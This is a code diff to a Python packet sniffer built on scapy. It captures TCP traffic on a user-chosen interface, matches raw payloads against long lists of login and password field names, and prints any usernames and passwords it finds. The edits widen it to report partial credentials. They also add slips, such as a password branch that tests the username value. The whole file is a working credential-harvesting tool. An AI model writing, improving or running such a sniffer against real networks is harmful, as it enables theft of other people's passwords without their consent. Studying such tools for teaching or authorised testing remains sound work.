@@ -1,8 +1,8 @@
 from urllib import parse
-
-from scapy.all import *
+from scapy.all import sniff, re, Raw
 from scapy.layers.inet import TCP, IP
 from termcolor import cprint, colored
+import scapy.error
 
 
 # extracts the login and passwords
@@ -17,8 +17,7 @@ def get_login_pass(body):
                   'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
     passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                   'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
-                  'login_password'
-                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
+                  'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
 
     for login in userfields:
         # checks for login field name
@@ -33,14 +32,13 @@ def get_login_pass(body):
             # the results from the search
             passwd = pass_re.group()
 
-    if user and passwd:  # if neither are empty
+    if user or passwd:  # if there is a username or password
         return user, passwd
 
 
 # filters the packets that may contain the username and passwords
 def pkt_parser(packet):
-
-    # check if the packet has a tcp, raw  and IPlayer.
+    # check if the packet has a tcp, raw  and IP-layer.
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
 
         # the information in that tcp packet payload
@@ -49,15 +47,22 @@ def pkt_parser(packet):
         # holds the username and password
         user_pass = get_login_pass(body)
 
-        # if both the fields have results
+        # if any credentials are retrieved
         if user_pass is not None:
-            # prints the site/the packets
+            # print the packet
             print(packet[TCP].payload)
-            # print username
-            cprint(parse.unquote(user_pass[0]), 'green')
-            # prints password
-            cprint(parse.unquote(user_pass[1]), 'green')
-    else:# else do nothing
+            if user_pass[0] is not None:
+                # print username
+                cprint(parse.unquote(user_pass[0]), 'green')
+            else:
+                cprint('Username: Unknown')
+
+            if user_pass[0] is not None:
+                # prints password
+                cprint(parse.unquote(user_pass[1]), 'green')
+            else:
+                cprint('Password: Unknown')
+    else:  # else do nothing
         pass
 
 
@@ -65,16 +70,24 @@ if __name__ == "__main__":
 
     ir = True
     while ir:
-        interface = input("interface i.e en0 or ethernet: ")  # make its user input
+        interface = input("Enter Interface i.e en0 or ethernet: ")  # make its user input
         try:
+            # iface is the interface where the packet will be scanned
+            # prn is function that's applied to each packets
+            # store determines if the packets are stored or not, it is set to zero meaning dont save
             sniff(iface=interface, prn=pkt_parser, store=0)
         except KeyboardInterrupt:
-            print('Exiting')
-            exit(0)
+            ir = False
+            break
         except scapy.error.Scapy_Exception as e:
             if 'root' in str(e):
-                cprint(colored("WARNING ", "red", attrs=['bold']) + colored('Not running application as Sudo!!', 'red'))
+                print(colored("WARNING ", "red", attrs=['bold']) + colored('Not running application as Sudo!!', 'red'))
             elif 'BIOCSETIF' in str(e):
-                cprint(colored('Not a valid interface interface', 'red'))
+                print(colored('Not a valid interface', 'red'))
+                print('\n')
             else:
-                print(str(e))
+                print('Something when wrong')
+                if 'y' in input('Would you like to try again? y/n').lower():
+                    pass
+                else:
+                    ir = False
